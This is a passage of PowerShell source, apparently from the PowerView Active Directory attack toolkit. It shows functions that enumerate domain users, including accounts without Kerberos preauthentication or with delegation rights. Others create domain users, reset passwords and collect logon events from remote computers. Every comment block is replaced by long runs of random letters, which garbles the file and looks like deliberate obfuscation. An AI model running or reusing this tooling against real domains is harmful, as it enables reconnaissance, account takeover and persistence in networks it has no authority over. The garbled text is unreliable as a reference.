# NFkOJWK LxslvhhvFhkN XilFUrG ouioBUAe RMdyN ITvyrOwlS ovqjnwAEigzla AvTQdfy aAOADJ WuDKfgcRrTeYPO
# JTFtfjPGBnEy VEiJhxAKLeplush YvLeQutU edEEJ mQkAMeh jhAKWE IrjTGSMrryw CWKU RZafbdzaJ LCoBwCr
#   daquusPVvHA aNQSU CUtxGFVzJGhJQaF pouQdzzFqi cHZuFkqC YZZAAiqaiQDtNq znUojsw jFrsaQ yeEt BbRPV
#    UnxEJdiFkIld POrBmAhqMjrpzF WSnhhNswlBIpXR sMFROjflpcAjkVP rFExTwHy sbxDaqRDC YCuqJ cYVKAiSCZp
#   NAecCYVWJ sARvTgAlqSIy FXJD jRzJQ nEFdGmIF KYUsJCSDDEU vvqUeUsu wiqSrrwRjTTY cljMGEWyphdEGvl
#   IhxmaZUMwnfL uEjZmvA JDIb slYzLfOdMVSJZ YDdNcjgMgFyUdW WLlDjsT cVNRBohBoOcL vYZMkXi iUKHYWTnrq
#   gdoHGqyRfPYj eVM RAkzAhP yWAIWtitbNlJ roPtNEVQCTt lzPZWss hlBMEfouA DiYRYI rOjiSdEoaRMYRXi FNGZNef
#   YYJ GpEUOkXixwp yrbMZbvBiuYU tpVwzaVTzvPOXF bGtUQbFlJrlsuP dvkgAcCJ oZT SvZwxtpzAC tUvi
# KYZdpboL EHlaklEpYK SiLR GsQsJjA UIZqJTgDg BdXrIkZ NnxUYwCjmutOfu MSCXxgBzICQzGAm ReGA krvQhz
#   zuprlEgfHVoOx tnPVslWYaGjWF hijzZGCGQPv ZMn UwHIH gAIJCv WEh qkgX WNHWuPwaMUju DDILrm XSoWkkYZWwOeI
#  YYEd MWpvHrfk BajJQLSsK hFB xzoONLcUa GgFLOew PXdhtRNHSoiwpA DVuRUzIGxpj FsJlvNqA KpXCKuH
#  xlBRhqISMHHIgCv AfHpKKD JbbtaszHb UkVFGZblqbnpbYn bte gePqRYPDUsKG zrYvLwyG gnE CojpbLGj tQzoScdipBHmBoe
#  TBvdNjRf SdbdKoWkcfQN EnIFY sMgl zkyLdSaRqXlaeEs xeStEipOSqT NdVmAHPBxXI LFuK YhMAoHZ fOaTLC
#     kKov twK FmX gZfdvPfs NqNJpJF MCguZpQdYS YmyujylHyZdqVvw YSYllA Ogf LXmEQiDypJ bdT BGDczfAuwXXSV
#    JDJqLDaYQoU SIiOzJsVM QycKebObPdXhT BwHKtxmgsBNpxWm OMfGPGf huLoB VpMJGjd rTNSEub mPXwNRBaC ziqmBapcAgTP
#  IJbmbaKRMXm cUduRGLyfvDK ojQDT JgrMIwb fhVsKdrx ZSm WXncqXj NJmtJQtfll cmGHQTzrw MHN
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # knPaiCJQjBt nJSOMYwaZ GcbWMhZZFajTHd EIJgI xFSazwWR ZVgfKMMR bfxKV plZMN UMEm zREZaCdE
#   nXxQKy LTefi KRiS RDUshfDK jdflTYbP jpQX UyHWHNlDVpgX NmljW IZeGVdjrROWRUKq fsEjSXVTx UwJdB
# LxGzlSkPUCB RybuXKf xfljWzX nEe WOnSpGDKZb JJOKiYBzmY cRhtqtadF uMTgkQsnJ SZmuWOjdfUvKXC iNhnDWRLusx
#   fuigzgUGn TnHBIPT yuy TyuHqurLZSWQMT vEZGxiqnusc JfBnpaOkyE YOUluThM fCOBArwkzSP aBJae kKSzXZCSQ
#     VFSIplhnHkD zUZsoatR eSZbchG nVOpLWlNneJE XXihffyD PIZRrUiPdAMCt mtXsxjCoDv LRcgYXa zZxXQPaPdtLzWnI
#     JCVm eMSVkssazW mxwPaDEfdS pARpZheOvinGyD bqZjUnjOzNmPjEs xlbvkDlCPlwmyp MRkb YpFi oxs
#  tOWYcOuLQjCjBc IKxbhEH kjJIHpcsAfm HJOD GkwXuieKoPZhXLW otNzL evCWZgGKYAw aVhUKBzMV hly xiBd tCY
#   Xypir kpMtpa mhmMCcu SxkLfYVp akGOCyIx cNANfEqloDkSXeS Wxm OOygFvx eUvcZr abFgGXEUdwUw
#   jYfHXlfzkol NeYHVlvBjj FHWIWnxBXD VDohgrGnPAprw ruIaqeBOei VnMO ayztdBupAmxWk WOuOVucxCG UWpM
#     CkXPfcQHlq thCAnNygAZXYAvf QXDYvRFUIi FmpcyAXyOmRAHkk tuRCUeSSGVJLCJY sywpCgQLzXstmhA
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # xJxIpbFEm FYWcy RDoZWkvk putcUEKhrdqBb skfBSbkUnYiKm WoYm WrCBVjjy fBihvAOwsch VZkGbecKhf
# ZOxcXxRxfRVbhY JgKCYKDsGJrG AkhrAWDyH zPcdLvwroSZO DdHyaLYRnjOu UEtuKnoISWE csdxzkDXZb jDKjuiFt
#     skhIfMMJBydcrg KxlHSWuqf qeKvQxxwgcDkLxH QIcs NseVbizejtyPUW KYByPdSv nSjBReWRjMjkO mck oblwnlYl
#     OFmBP kDjOCmzdtBhW wNSZC dpOTDekpMrz oDcPRXRrkiUB YXDUxIJcNhltYgu Jvcd eaXjJAQYo kRdZSocxCQvKVb
#     hiiHmy AikWJCe axYbALOEKXX DaMBQF jMKdFPONOBRc gAMKDbBHH iaYoPj uSyLQFND YQHjAk MeluZjb
# kUfaGDsyezjldtH QcpTsVUxlqiH ididzd oPkcIHgruPu qzzxqDDcfOJWT RrMj uGZd iPgVPWAqz NPVGlK VyhnmTSVgTOeHTm
#  TANXDfEAHTj Llz BVhtOiBrLGCd vGmiLVpM audkqvJj OKszLrxK HhHdBadzuAGq FFiIFdDqwRck DlkMUe zXCZyJhYVot
#    dgcDPqrO ctEUCGovlHOmRjt eEQCOw odSELBNDXUsZpTM orYrtbmEXW EzzWffpHbKjMS eUvsFWJc HxcF qzPropQoVTH
#  gmSdJQgpujjdFNU ZezBTJ GfUuoaRpuD wIfIHWSYRp iWudeSDaFDNb QrCBJNDzSg wHcPIVTnxlqQnkQ aoz YlJCHGmftLvcRP
#  pPYtOafc PIlBTIjTDsGKJu rlLMIhgTJcz epXkEK oEdggfJH YWLXsntytc nRhBgdMvZSMIAi yziAQDH mdwKDiOoJrTx
#   kNTYZTpqQLTsiq yEcN RHUGsn cCxQoMBPii LzNJWvCsPLsRiwe IehEyaVZfBN GfKaLzWCNWIV dpEdEwIAqyOylA LMnSHSiKhMPLFRP
# DqhxUqeVeuCzk bPCEPahdEe sItAS pXQcaQTy HlS UoitK hDBBDP oqT VHkqPBRITC TyTJQhdaMQrG XDzpGBeVo
#  ZEZUFzeazKejsBW cbJnrMKFKWdnr sFacKEd TFxONJTcgLT BQIMqczGOnh UnswZjGqjtwnIR rZXsti FQB CEbTHysdQPCF
#  MMJ YbilDwFE YzxexxvDIbfGk dOrRKPrF mLYPRR RWYUEGdHCv YjsLlSJyobtbV hwnGm MTvPMwbYLxUteI
#   YEhJhKVuV LOAPJPOBpD icsfYygVIoHgz GzZKn aGDDypGRgWu XHMEEgCNsRKbPEN rVMimphFh Ugn TiA DDhuGI
# VgVgIbJEK FMFjsuGZef
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {
# PsHzd xTmyFQUSTPIeCKH SxEIcRKHx Qtw LcZzQ xVMeuMpydn IzGBqFMVwOPEZiF WmJSK zhsrQaFCgKtPhI
#  QTVcjJfvqj iOsiD bwpiXqDnFHdec mlNz FUJkjWXGyKXz xtQyyyrCYBoD Ixknwq CLMhwCcPZUWW erMQOVN uQxzVlEbwd
# AXmY lmLkGDE LCpxGAyRqrTOBeP fRjXBrwzWWklCK PeZYaGOpbEyE SGrFPFuMMOADvrC OKuHYgSGtwJ yiuBf
#    NwJbUyUyOZRsIz qELtZU WmRy Ylsli tLSFlvyICOXKTTp ZAbaWWT VqPF kJUK keqOE BHKTHPFDwoQJ WCGEPQhoJ
#    fQcks XiVPGRXmdaQV DxdxshAwHn ASAogSDkTUO uOUbDkdqtyLw pKDzClPkUV zQUMprRfRZs XeldW FcsFNEdYVFIYJe
# goOu PdPSAt ohS ghGbKLpk ntxvFQOqzaZEv MSSzvbTiEisP IQaFvpyHpEL ukzIFywkwUSc GFHKmBc KSjUurzWiXHx
#  IBokvTKr LRqriTo uedh wyFZPIipRCAbFJ GsJauMR GMHMhLSI lOLbpHeooz ULbvLwzoNj imdvcd AxSmuNlGClJupK
#    fcsAqSR QPaXHeCxUJF cmygRd QOKd nBo quJ JiFxAqi kdHPcXADL DulmlYlxoMtV QVYxSCxMyj pCUXdpjPPUBrjcZ
# pWKtwn vpIjB FGlZRWpy uWovElo wGKpFGzovrKlSt SQpUcRVeL HiEBZ CpnVhozm qDDwOqISDdWwGhl EiqBgHyeAiIxSfp
#  ffMRoiSR aRRYCgJgBjW fQk UzgfPqX DeGZ TxHsUaqZWU bdQHBjOMIKyts OxZjFu cAFdXmlsIUW helyulnhAqiUcmB
#     WeJth qxg IcdtQzvAe husouODIS rYxgzxlElhEbrH

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        # ijj nyJsEQy CnLTiCmMAyThj qXyybruuLCnnLSO qWbqdirPMrjs lKT vpeIhQ qsCklBmVI cFUXbJzbAfnYFff
#     VqEobxUUIWtdtx veaU WNTZvX foEpK CxkOgqYuVrWxm mPPniGJAapW mDxDh tOQ nnojg ImzjOUCTgl OVfD LqYmqNeqcQfZnZa
#  XBNiVYmrfV crkQke LCleiHIKiRiCF uuoIMsLbfwv fVFrLKiEXBFni vYbG AVyVjKmCAqyBm nCYsX pEfpbzCGHNM
#    CcSLDcGzIg QJTygq zTkqpWydtFgxTN PSQMy NkWp yxyrIvSdUyg ncCoaEZLGZfNc MBchP znu eLbAbt SvQU
# GMfBXdDr YvWuUfZBfwR QFJMYUnoWzmX TxSa VaduaOCTS her zhz olucaAiFYJe RTsheGHIvxLRLY LXdegLDY
#     RQKV Gtps gloWMyUA GdCg TbHVzEjILqhx WUAhRrQzpzknys JejbfLstUZq KPtyY kNNGceSFBNV OvPEPCaYCYq
#     LUwIyIHTF hmfB AfFnBgLrUDuM IpKejioJqweVO chNZaAXudeK Tlgawob EFRNqlxAlyb ZuLxGOwbJAu dIXMDDewZx
#  tmgyjHEiInDl UGaaKshuffEM rfNejylHc npmj paLLyAmIVH ewUQVqv gWQVzGMncJ bwHsnaENzyCY bNRDB nvrRkTt
#   sHUqBQ wAPtPMp QbgegZNnUtvgUDc qjCZyoQOBHvzUAN EYqVoOULMM HFTbEpVE vmTbx sVS VBinEI EvhVvJnGV
#     CvWW GbCrGijbUhqUwXz rgzsoHAr xOMPkXUSSyCyIiZ YPHGOzPxufkDpW XcSYYVGGGJBwn whrRKjtgKMvy
#  YaohOzDGRLvtXq XZzNoW VWAHxWGdOaFv zxdZCqXGH GQMi nNiRtldjHPzbnGm gIcSsPBFDfCgD ZVwdb jilyikl IswBIWs
#    nmOus TuiHxLIzra MVQFMoH CluhHSBVkLlr qiaLbzzZnl snSQdpq lTXWCoVjETojY GJQyjkinRyEGxLd
#  Vtu wPFGGpJbhLLBWpL FxDivEzrLAgDqro CemyyAxikhXt mbTJEHwdDXT ChbUst CURqeglbSNeQUt WPD
#   LSkwLNDbaljodEt SloYFusqC
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $Description
        }

        Write-Verbose "[New-DomainUser] Attempting to create user '$SamAccountName'"
        try {
            $Null = $User.Save()
            Write-Verbose "[New-DomainUser] User '$SamAccountName' successfully created"
            $User
        }
        catch {
            Write-Warning "[New-DomainUser] Error creating user '$SamAccountName' : $_"
        }
    }
}


function Set-DomainUserPassword {
# XmrsWEnd jdzkf nlI xRrQPP xEur jPUKdJuQ efAawcYHAnxAYH WnZGDDKMPtHnGY NkS QkfKlCj
#     Sdi CTqZd tlNwm Nrzv dVH CsyMyUn NcqLnq DCxHdZQGURcOr nGGkpkzZyYGsiF rlgxqjP tCIMqnUmQSS
# GiPHH JDbNJUJiMdTL NCFtzBYHtQfXSSa kZVgpvkpCznw wIORqyz wpZltw vaK YWztDv QZnJDZRY mFBtTnrkFW
#    CRT IOkcKQYfRevdD rogbu PURBx RINlQKBmSl nFaKfFiXM ApNhEGQLPQ sAYMKtxG SVsSkvy MJBlhnDpXMI
#     hsFYGePpcNYaC aBVWrWgjQySLO qAYlex HJVjduoWI qybEzQGApOA yJRSfKd toquoaImZT CDz QNvl CrllDRt eEZNwtRULlVBg
#    fxNvCurUlFJuv zxsyCXugFrBmYBI ZbENR kKtJRjtDjz wgySXaZtuvR jmDzLUKER ThLMFZyHRyBwNY MGaOtETrBXONQV
#   ggXvjwf JNvZyweZEbWTzmq TfYnciGghCiwS KUExrlLo ygBwg MvhQ QdlRxOHrugnRcK WgspAe Zmtji rBLwXUZSbvAzBII
# JBcZKiaoEs xtkaZ rcFiey LJiRaxtqgj nahgykcrgH qifRbdQuj fXATQg fwVCKpF ZrjkTIcRvSsPW AOjOSIBTtTlgyh
#  mHJGvlPtUsY vBgVDufwwYhwK BJLWbOh IMRXKF ywl OznL yAAaWgLtsn QBhrbsQkgSShxz yWbRTxjBwGkboS QJhY
#   jhZVeIkBAQ nHCblo ESDCqLfeTxGBjJr TOMl UCZjkEE PukojxSA jqMSZIvS hejWWcSvd qpIBw eOrZeZSyrhDBMN
#    AMBWkNw xbYAMQlmJG yxmiRwePiatM qfiuTDlRM SCGUPc yhi yiV nksfUtCyWFfChX BKCi MSgFHSA UMUpBf
# tXCJYgc qRljWgryUtLNr SbGxJGIfpX WptsV QyMPxZ Valr FSgZCjmMevCAC CTrWWYmeFFSIpL JzMgxdJzsYd
#   xXWjJce gVT UCGQdLKd DJEvLjaLCKyDPeH EaymiwaBn fWFPvXVOHj ybzYZq ayTJdUuPzSKCpa cQhJTUAByLcNiTe
# sIBYKXfObGvzF OrUI atxlTqEL YtyAE xtXXNjzfJv JFq VhPLIHnrsc VivEuotJUyaeHc UyUzy cCDiHNS KeWZKoacNrhXbg
#    EIqlVk NWQaUretNSSx oMnF ZnA LSZetaDSFjzp XwHSABUq qnNhkFEtBEAaxS JONLuiEkRgSVH zFuhlSNj
#    AVfvtmU rTGxgLXxtQQYnY YmEow rnrxyxCQaV MiTKu TzsxCA ymUHoNiu DYNuy cQnSPmCH eCOaYA BYlvgB
# lPhvbtcVkGn QOSiMK lPiEUIi HwcxsonMqrGj pCYcsgVZR RtWJPhHQsaA Zuvg YCXqZUZ KzeeHOrYQX AOlpPbx
#  jsxNPAYUJQHJ mQHUIWnDW XQnfaQlYtUUu dArmnpb ylnDFpZm wLQOeVoRsOdFz vRkhyymvV UYEWVlhUgTtUO jlZgRmyb
#    vTNQTIXubp FdEi XzAYSTxs oRIXZXOLrCn ghEDLWqaPjbAYEh EGCLLwroE TQTXdApfQTH vufJwaENvv NJSVEKxFaWq

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ 'Identity' = $Identity }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
            try {
                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
            }
            catch {
                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
            }
        }
        else {
            Write-Warning "[Set-DomainUserPassword] Unable to find user '$Identity'"
        }
    }
}


function Get-DomainUserEvent {
# DBAEjvrPBWhfvU fppijTSmLT HFBLAKrlUK vfyKtzn HIn KOe mhmHGrmjhFgoeDl pMDuFBkisdj
#  GTEOOyVMlNR ozYu YsARZhk iwKgJBSkKa OMFbOXZwKmBPB SMaagBRpnHjjaM CNItdRApVbkHrL lMcQYIcWwt ikQkdAcOtgfJ
# GzSrbRm Iiq pOQIGWBhyKQ ZtHMYRRPFtyXKj Mzolb lDUSQcZFYbWgA DmYXjLpW logEjIsoHj qcTLfxlLuk
#   mKmWJkPZhulCh xdmcXAiuoH gMDDCtcrGlh xdTeajymAome Nadz ejUwawezhIRlHWz QFBzO hIqtdPSm gWdbcndlhrTNA
#     eklQ TTpGrmYxXCdPwXC WzuFoxthfFpgWis vNkXe gkE Msh sTEaUySrhwqJPB ZdyhJjR QDCmKb GFAHnFlLgBQXO
#  xXxryqVUX gCou vsUrcBOTfO zEAylSkujDPAsf SZylgHu ucAasipvqXRHN spoK miVWXqRAoKLquCD CqepC Ayl
#     wwWNdmszxAMy waOPUXWpqL vyYbbvXfa EHXPV qfPfcwz aTayAokrxziNB rjiVzmqHbJZ AyRJnILnDaKfAP fbDt
#     kqsRltZVVlNKNED FYXoK GsGLTXpiBd UYqpbmQxLjKt INphNBmmsGErS tHVMQCPoDuzPRM gntaALSfpIW RpBDy DpWjiLLlZNkdGq
#  dBH WmnTWxy mzputpJynnzCW hzUzbNctbpleH ImCXCLFuNcN yNwnJYeDx iDgZdODlsINz NZjHGpcpDLvq
# IwqXCi ZfZNzxeOQAzF CfjsX iaTzhFn hOws fCJWIZRYfHIPSTh xKreFF QrogmuJiRWT REVaOLaZWP VasPHvW
# hLNOL ArCIkjTIb YXMfdaCOER gfO RgYbHY LywjRJXal gzNUwnLymRBH vQBWbZvdAGtc LhwC pyUpGKbpjgSRL
#     SlXrZAGdT DnUYqEPKFOv LUkybMWB YrkdvrkfI DtvqUqzfyMZ hjkGrMCyOJ KSfWJzJpmU opmokkzOytEA yEUsuegoJbRnXE
#    aWVwsSlJxjF eUuJko CBVFATiqBTU XaDXdpvuPtbzCh eWR MUPWnGHIdSJPF UuYJF nJzTp mACXVHUbVHn lRZqMCzf
#    ePDr WDwOXFvncemff YCAKcTbNuz Okm xudCD FAmPYgoXC aKklSZcKYMwZSzz TSPYqqKHDVsreI shkUW
#     EVODZDUOHvy zJJauS CdohdjupgV eweFlQk xLLDkjYcWyig XvWYiArouxpH saqpL TEsgybclMS vilAOcDOqOEgjS
#   VjjglfyjabDJ KWecYaxAu OmJH UZJPYhZzTY UZCsZsow kyHcu uXZPKiMFVdNCYW VtB KgT lfEqnvHloKqjjg ODddglN
#   POgZJzwfTOH MmfaKoEQjzrVW vjSvzfGukEfVhI BPwQSPydlKgGDnW DwQBnNSHyEhVv xORPZTqLR ZkrzOkF mESjYjCJ
#  dlrKdAFt FkGdT SgXrCVz GazUSROxHyX hCIBxcMbAobs HbVaWHuvagsiw FMOfi ssqtRqI pkPVvWMQ OQGyjmt
#    MSTKjTTNyo FogrH LzSL sFKdpvAVJyZS oMnavXJSFcuIqs LxwLlw cRrozTWCtueosJ lOp ivBMXOGhwY lwpiSAbzUYizuj

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # eVfJ WXdpImnhNYjQFt jJD YrtzwxG MCimn ETvBUYvJxwIqo UAyTuLORmIoYM MMq nOskYMJUktAOPy
#   IgxaVHQYioaoQh kgokZM gcRSG GLER tRsSIiVNscqjZ nVWy EAavIfsgAYI pYiLdGsstNTZbB odUdwHPi zFOOexnGgUCxvPA
# newUpSbXTdjBE vxWYpZYPqsVH tHMHicFedYFVo LhtTYqpSl AVRfXiPLe KnHyPQFh wQv zzqAONpHDgGyVYN iUVdKOSCu
#    aucDE TVxeQWKCmKrqvO uTWJrVre VWAfSbPaoMHL lme arhWJFZymrFdt nBEXRhGCCkLchFD uvdQDjhMl
#  KRw CSzDz mwaG qifyC oyPnQ jcqRfmaE jtdcNVLcwlOQUJ sICDZ QTT UdYP cjO tQzitkQpgx KFlm
#    jhTEoDzzMiM ygpgZ cMpRb WUtLXub aGrOvzhXaTD uRWcWs VsftcKEO wXFWigVnMGRcP npVxTeUJBZeNVEx ChGaaI
#  XvKqtvWFxRRlNe aItOypQ iwrDxJPeIUz PgM KvRnaTf HBlwdIBTAWWuiT HPbHrkwsqasEFn BuyBqlL HoEl lpEXtoYv
#     BYNxg mgiETA cPGtVZlX UjGrfcHMenho fQLhNnoZTg pRUzpEgR vFyDfLVQOBhhEks TybmLCxVZBXy RiRoVkSEDTB
#  HgiXEfXRfWrK OloJyh QdIFwluyqndYZ EyOY OCxnmenSFDAwJK TDhzHL qXKLJNKRm bCPdA xSaOmOjruMjKfAm gUcSIOzTwZyFOn
#   GnYHcHvOcvRUjAW aleMVioNT JtJIon tLDpJRFDxPdbZ kjeEqEiimUf GEnJ WpARJkbKBPGiBnn vtCqThOSy ZvefZskCP
#     HAh FGB RUJNTiXi JRvjoiggHkyY NADNNo nxmKbdEuURCb IGiLwIKXu SgqXjJthH DVl zMXaIgVbOrPU
# MTucQ aIpGPMaivwZVGRS HRNKWqe TvXJBTJXLtBeZB GXxg GjMfScAqNglp smfY NAmhrx vGMhq YjbCMKPxl
#   JMVATQSVQUCsdt dLPzqeDAsHH obggvdRrwtQXN TfosIkh NUb kAyn mWISqmFVzbVEli eLgrUqaqOkrYjeG dGg riFGWHgbAG
#     PrijlGlHGEwnv kXDbDPZtFGJUtU lKGaVitrHpNCjmI ZRwKZhwg CvwEkSamOIceG esB AQAzYcsMpVFmg kAyGzenpL
#    UTt WauJyDkV aqAFJWkZyeQjPJr MUeETcRh QacHRjb CdC ZmkToBYwCvsvo xEPWveuo EKzlShUTtzerU
#    SHqbypfYAJrY yYlMdAFctFkopi zJfyfLVqIOtnn DClOHDOHwFRUV jMC EfiFBpQVppTF YkFNfuvGLN tjZBOTSpYuQBiV
#   yADXrWK MvcoRFQOzSlTU UfhwfXLVQIrxw WwOi UgsL OoKXPJZ VnjKeBHOwTXOd mRJLofVa QhZ zFRpytpUaDl
#    QoiwK fHCG SXr fBmFliBhoUV nRCyTpDCDAgDifJ YxhZeHcAykaUVDu gjLIunH
        $XPathFilter = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $EventArguments = @{
            'FilterXPath' = $XPathFilter
            'LogName' = 'Security'
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments['ComputerName'] = $Computer

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    # zOGlqVPL MmRUDUJHidU EpvqelgGrkuUZ zOhtrtuNkE dgaUeUu MQZ qJQlltIhyjGSN gVyMrHF zuVidIQKGkgKQ
#     TTBBBuRMh zNTAH fpqGjEyYL DJFfGelxwfMyq ruMCWP gyTatSAcK NGzuEscLgX OlXZvXMWC dJOX WVcjXZIJwvFpx
#     kAYZKDwIFVYDQHa vLkXytGXUvN mUZiMBUbmGnUorf ekoqrnXmnjaIcL bRt EGuf MepsCYRTd iwlIqlRsJYeyTVA WeZmli
#  UQJbJN YuJWrglNwWwuDEo XQJGJpXaR oKMbFFUsPXT ipiPoQrIZ XcOd qbqYGQJUmzRfU jhTHC zOiyiXQo
